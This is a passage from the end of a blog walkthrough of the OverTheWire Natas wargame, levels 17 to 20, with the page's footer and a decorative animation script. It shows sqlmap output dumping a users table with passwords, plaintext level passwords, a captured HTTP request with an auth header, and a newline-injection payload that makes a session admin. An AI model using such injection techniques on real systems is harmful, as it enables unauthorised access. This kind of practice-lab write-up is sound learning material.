+back-end DBMS: MySQL &gt;= 8.0.0
+[23:41:28] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[23:41:28] [INFO] fetching current database
+[23:41:28] [INFO] resumed: natas17
+[23:41:28] [INFO] fetching tables for database: &#39;natas17&#39;
+[23:41:28] [INFO] fetching number of tables for database &#39;natas17&#39;
+[23:41:28] [INFO] resumed: 1
+[23:41:28] [INFO] resumed: users
+[23:41:28] [INFO] fetching columns for table &#39;users&#39; in database &#39;natas17&#39;
+[23:41:28] [INFO] resumed: 2
+[23:41:28] [INFO] resumed: username
+[23:41:28] [INFO] resumed: password
+[23:41:28] [INFO] fetching entries for table &#39;users&#39; in database &#39;natas17&#39;
+[23:41:28] [INFO] fetching number of entries for table &#39;users&#39; in database &#39;natas17&#39;
+[23:41:28] [INFO] resumed: 4
+[23:41:28] [INFO] resumed: 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd
+[23:41:28] [INFO] resumed: \x02
+[23:41:28] [INFO] resumed: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+[23:41:28] [INFO] resumed: natas18
+[23:41:28] [INFO] resumed: MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2
+[23:41:28] [INFO] resumed: A
+[23:41:28] [INFO] resumed: VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD
+[23:41:28] [INFO] resumed: user3
+Database: natas17
+Table: users
+[4 entries]
++----------------------------------+----------+
+| password                         | username |
++----------------------------------+----------+
+| 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd |         |
+| 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ | natas18  |
+| MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 | A        |
+| VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD | user3    |
++----------------------------------+----------+
+
+[23:41:28] [INFO] table &#39;natas17.users&#39;
+</code></pre><h2 id="natas-level-17-→-level-18">Natas Level 17 → Level 18</h2><p>Username: natas18 URL:      <a href="http://natas18.natas.labs.overthewire.org">http://natas18.natas.labs.overthewire.org</a></p><p></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas18.gif" alt="natas18 demo" data-is-external-image="true"></figure> <p></p><pre><code class="language-zsh">
+Username: natas19
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
+</code></pre><h2 id="natas-level-18-→-level-19">Natas Level 18 → Level 19</h2><p>Username: natas19 URL:      <a href="http://natas19.natas.labs.overthewire.org">http://natas19.natas.labs.overthewire.org</a></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas19.gif" alt="natas19 demo" data-is-external-image="true"></figure><pre><code class="language-zsh">
+You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas20
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+</code></pre><h2 id="natas-level-19-→-level-20">Natas Level 19 → Level 20</h2><p>Username: natas20 URL:      <a href="http://natas20.natas.labs.overthewire.org">http://natas20.natas.labs.overthewire.org</a></p><pre><code class="language-txt">POST /index.php HTTP/1.1
+Host: natas20.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+Origin: http://natas20.natas.labs.overthewire.org
+DNT: 1
+Sec-GPC: 1
+Authorization: Basic bmF0YXMyMDpwNW1DdlA3R1MySzZCbXQzZ3FoTTJGYzFBNVQ4TVZ5dw==
+Connection: keep-alive
+Referer: http://natas20.natas.labs.overthewire.org/index.php
+Cookie: PHPSESSID=fndjq952mceaq4hivld730tim3
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+name=test%23
+admin+1
+</code></pre><p>payload name=admin# admin 1</p><pre><code class="language-zsh">Username: natas21
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+</code></pre></div><footer class="content__footer"><div class="entry-wrapper"><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/natas/">Natas</a></li><li><a href="https://h4ck3rfirst.github.io/tags/natas-1-20/">natas 1-20</a></li><li><a href="https://h4ck3rfirst.github.io/tags/overthewire/">overthewire</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Foverthewire-natas-level-1-20%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=overthewire-natas-level%201-20&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Foverthewire-natas-level-1-20%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=overthewire-natas-level%201-20 https%3A%2F%2Fh4ck3rfirst.github.io%2Foverthewire-natas-level-1-20%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/hackthebox-smol-walkthrough/" class="content__nav-link" rel="prev"><figure class="content__nav-image"><img src="https://h4ck3rfirst.github.io/media/posts/18/responsive/smol-xs.jpg" class="lazyload" loading="lazy" alt="" height="225" width="225"></figure><div><span>Previous</span> HackTheBox Smol Walkthrough</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/hackthebox-conversor-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> HackTheBox Conversor Walkthrough</div><figure class="content__nav-image"><img src="https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-xs.jpg" class="lazyload" loading="lazy" alt="" height="225" width="225"></figure></a></div></div></div></nav></footer></article></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
